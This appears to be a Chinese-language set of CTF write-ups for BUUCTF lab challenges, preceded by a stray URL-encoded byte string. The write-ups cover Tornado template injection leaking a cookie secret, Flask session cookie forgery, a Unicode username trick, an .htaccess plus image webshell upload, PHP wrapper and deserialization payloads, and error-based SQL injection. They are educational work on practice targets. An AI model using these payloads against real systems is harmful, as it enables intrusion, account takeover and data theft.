c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab
```

## [æŠ¤ç½‘æ¯ 2018]easy_tornado

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/file?filename=/flag.txt&filehash=97dd75695d91c287b2fe25eb1415e308
#flag in /fllllllllllllag
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/file?filename=/welcome.txt&filehash=f68e451d4b310cebb7ac875551d66f8f
#render
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/file?filename=/hints.txt&filehash=5d3b2725d70cacc2c902c8540bc869a3
md5(cookie_secret+md5(filename))
```

flagåº”è¯¥æ˜¯åœ¨ /fllllllllllllag ä¸­ï¼Œä½†å“ˆå¸Œå€¼ä¸å¯¹ä¼šæŠ¥é”™ã€‚æ³¨æ„è·³è½¬çš„æŠ¥é”™é¡µé¢ï¼š

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/error?msg=Error
```

æ£€æµ‹æ˜¯å¦å­˜åœ¨SSTIæ¨¡æ¿æ³¨å…¥ï¼š

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/error?msg=Error{{5*6}}
ORZ
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/error?msg=Error{{5^6}}
Error3
```

tornadoæ¨¡æ¿æ³¨å…¥ï¼š

```
request
handler.settings  ï¼ˆsecretkeyåœ¨è¿™ä¸ªé‡Œé¢ï¼‰
datetime
```

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/error?msg=Error{{handler.settings}}
#Error{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '7a72647d-22c3-47b4-a2fa-79a0f9f4000d'} 
```

å¾—åˆ°cookie_secretï¼Œè®¡ç®—å“ˆå¸Œï¼Œå¾—åˆ°flagï¼š

```
echo -n "7a72647d-22c3-47b4-a2fa-79a0f9f4000d`echo -n /hints.txt|md5`"|md5
#5d3b2725d70cacc2c902c8540bc869a3
echo -n "7a72647d-22c3-47b4-a2fa-79a0f9f4000d`echo -n /fllllllllllllag|md5`"|md5
#08b1ca5536ad830d75296b8f905f749d
```

```
http://1c95d1e9-b281-40ef-994d-92e08d869293.node4.buuoj.cn:81/file?filename=/fllllllllllllag&filehash=08b1ca5536ad830d75296b8f905f749d
#flag{dab42487-1544-43e0-9c90-e2dd9f498e03}
```

## [HCTF 2018]admin

æ³¨å†Œç™»å½•ï¼Œå¯ä»¥ä¿®æ”¹å¯†ç ã€‚æºç æœ‰æç¤ºï¼š

```
<!-- you are not admin -->
```

ä¿®æ”¹å¯†ç çš„é¡µé¢æ‰¾åˆ°æç¤ºï¼š

```
<!-- https://github.com/woadsl1234/hctf_flask/ -->
```

å»githubæ‰¾åˆ°æºç ï¼Œå‘ç°ä¿®æ”¹å¯†ç å‰è°ƒç”¨äº† name = strlower(session['name'])ï¼Œæ­¤å¤„æœªä½¿ç”¨pythonçš„lowerå‡½æ•°ï¼Œè‡ªå®šä¹‰å‡½æ•°å¦‚ä¸‹ï¼š

```
def strlower(username):
    username = nodeprep.prepare(username)
    return username
```

nodeprep.prepare å‡½æ•°ä¹Ÿæ˜¯æŠŠå¤§å†™æ”¹æˆå°å†™ï¼Œä½†æ˜¯unicodeå­—ç¬¦ä¹Ÿä¼šè¢«æ”¹æˆå°å†™å­—æ¯ï¼š

```
https://symbl.cc/en/search/?q=Modifier+Letter+Capital
á´¬á´®êŸ²á´°á´±êŸ³á´³á´´á´µá´¶á´·á´¸á´¹á´ºá´¼á´¾êŸ´á´¿áµ€áµáµ‚â±½
```

unicodeæ¬ºéª—ï¼šæ³¨å†Œá´¬dminï¼Œä¿®æ”¹å¯†ç ï¼Œç„¶åç”¨æ­¤å¯†ç ç™»å½•adminï¼Œçœ‹åˆ°flagã€‚

æ–¹æ³•äºŒï¼šflask sessionä¼ªé€ 

æŸ¥çœ‹cookieï¼š

```
Cookie: session=.eJw9kEuLwkAQhP_K0mcPSSQXwYPLxJBAz6DkwcxFfMTEmcSFqDi2-N-31wXPVf1VVT9hcxybSwez63hrJrA5HWD2hK8dzEDbxEvb9SiyUIokwMg4aVuSxSKWQxlgvSKk0ktaDyrFhy4OvabcSVE-9GA6pCxEakOMMlL1KsCinPLt3VgXyzTvDLNMipEU-4cqVoEqKofUWxTfToksNqm0qtYkqep10XLWsmO_Zw_32DMziXRd9Uokc3hNYH8Zj5vrj2vOnwlI2puaq1nN-GWn6tyhwFCla46pnEzLP22qKYl5QmwEz7nP37jTsG2bD2ldmRwX_8p5O7AA3nuYwO3SjO-vQRjA6xdcX21d.ZDJfLQ.ZCBKC1Ipe7JNn_MrGtDnXl66kU0
```

conf.py

```
import os

class Config(object):
    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'
    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'
    SQLALCHEMY_TRACK_MODIFICATIONS = True
```

æ‰¾åˆ°ç­¾åå¯†é’¥secret_keyä¸ºckj123

```
python3 flask_session_cookie_manager3.py decode -s 'ckj123' -c '.eJw9kEuLwkAQhP_K0mcPSSQXwYPLxJBAz6DkwcxFfMTEmcSFqDi2-N-31wXPVf1VVT9hcxybSwez63hrJrA5HWD2hK8dzEDbxEvb9SiyUIokwMg4aVuSxSKWQxlgvSKk0ktaDyrFhy4OvabcSVE-9GA6pCxEakOMMlL1KsCinPLt3VgXyzTvDLNMipEU-4cqVoEqKofUWxTfToksNqm0qtYkqep10XLWsmO_Zw_32DMziXRd9Uokc3hNYH8Zj5vrj2vOnwlI2puaq1nN-GWn6tyhwFCla46pnEzLP22qKYl5QmwEz7nP37jTsG2bD2ldmRwX_8p5O7AA3nuYwO3SjO-vQRjA6xdcX21d.ZDJfLQ.ZCBKC1Ipe7JNn_MrGtDnXl66kU0'
#{'_fresh': True, '_id': b'b1168e0254143fd6835096e41d335174f8c2a7ec2d452bfa3253853b39d4157500f994baf83dc647294495d39c00d829dcc9f375ea8331adc139d6739a6aee81', 'csrf_token': b'361ec2b6491a9bd0358dc05d4e2b67c198c9d517', 'image': b'EVI0', 'name': 'xxx', 'user_id': '10'}
```

nameæ”¹æˆadminï¼š

```
python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': True, '_id': b'b1168e0254143fd6835096e41d335174f8c2a7ec2d452bfa3253853b39d4157500f994baf83dc647294495d39c00d829dcc9f375ea8331adc139d6739a6aee81', 'csrf_token': b'361ec2b6491a9bd0358dc05d4e2b67c198c9d517', 'image': b'EVI0', 'name': 'admin', 'user_id': '10'}"
#.eJw9kEuLwkAQhP_K0mcPSSQXwYPLxJBAzxDJg5mL-IiJM0kWomJs8b9vrwueq_qrqn7C9jTWlxYW1_FWz2B7PsLiCV97WIC20SRt26FIfCkiDwPjpG1I5qtQ9oWHVUZIxSRp06sYHzo_dppSJ0Xx0L1pkRIfqfExSEhVmYd5Mefbu7EulHHaGmaZGAMpDg-VZ57KS4fUWRTfTokkNLG0qtIkqex03nDWumX_xB7ucWBmFOiq7JSIlvCaweEynrbXH1cPnwlIejIVV7Oa8etWValDgb6KNxxTOhkXf9pcUxTyhNAInnNfvnHnftfUH9KmNCmu_pVh17MAu2N_HmAGt0s9vv8GvgevXziDbf4.ZDJ9sQ.OpV_FBgKUuuMkDB0_yqBftvUt1g
```

æ›¿æ¢åŸæ¥çš„cookieï¼Œå¾—åˆ°flagï¼š

![image-20230409165837485](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304091658577.png)

## [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢

ä¸Šä¼  .htaccess

```
<FilesMatch ".jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

ç„¶åä¸Šä¼  .jpg æ ¼å¼å›¾ç‰‡é©¬ã€‚

phpinfoæµ‹è¯•æˆåŠŸï¼Œä½†æ˜¯systemå‡½æ•°æ‰§è¡Œä¸æˆåŠŸã€‚æŸ¥çœ‹disabled_functionsï¼š

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld
```

èšå‰‘è¿æ¥ï¼Œ/flag ä¸­çœ‹åˆ°flagã€‚

## [ZJCTF 2019]NiZhuanSiWei

```
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```

ç”¨dataä¼ªåè®®æ»¡è¶³æ¡ä»¶ï¼š

```
http://7e993536-2a0c-4ca6-bbb8-6f52937c7473.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=php://filter/read/convert.base64-encode/resource=useless.php
#PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```

Base64è§£ç çœ‹åˆ°useless.phpæºç ï¼š

```
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>
```

æ„é€ Flagå¯¹è±¡ä¼ ç»™passwordï¼Œæœ€åçš„echoä¼šè§¦å‘tostringå‡½æ•°ï¼Œè¯»å–æ–‡ä»¶ã€‚

```
<?php  
class Flag{  //flag.php  
    public $file="flag.php";                                                                                                                     
}  
echo serialize(new Flag());  
?>
#O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}%
```

```
http://7e993536-2a0c-4ca6-bbb8-6f52937c7473.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

```
<!--but i cant give it to u now-->

<?php

if(2===3){  
	return ("flag{1398ad06-5db6-45a3-97b6-fb97b40dc8ab}");
}

?>
```

## [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL

ç¦ç”¨äº†=å·ã€ç©ºæ ¼ï¼Œä½†æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œè€ƒè™‘æŠ¥é”™æ³¨å…¥ï¼š

```
http://dd5ceb69-9dc2-4de8-91f8-3367ac8b02a8.node4.buuoj.cn:81/check.php?username=admin'like(updatexml(1,concat(111,((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database())))),111),1))%23&password=1234
#XPATH syntax error: 'H4rDsq1111'
http://dd5ceb69-9dc2-4de8-91f8-3367ac8b02a8.node4.buuoj.cn:81/check.php?username=admin'like(updatexml(1,concat(111,((select(group_concat(column_name))from(information_schema.columns)where((table_schema)like(database())))),111),1))%23&password=1234
#XPATH syntax error: 'id,username,password111'
http://dd5ceb69-9dc2-4de8-91f8-3367ac8b02a8.node4.buuoj.cn:81/check.php?username=admin'like(updatexml(1,concat(111,((select(group_concat(password))from(H4rDsq1))),111),1))%23&password=1234
XPATH syntax error: 'flag{422c3bf7-d5a6-4ee7-bf07-867'
http://dd5ceb69-9dc2-4de8-91f8-3367ac8b02a8.node4.buuoj.cn:81/check.php?username=admin'like(updatexml(1,concat(111,((select(group_concat(right(password,28)))from(H4rDsq1))),111),1))%23&password=1234
XPATH syntax error: 'd5a6-4ee7-bf07-867d8665e3ee}111'
```

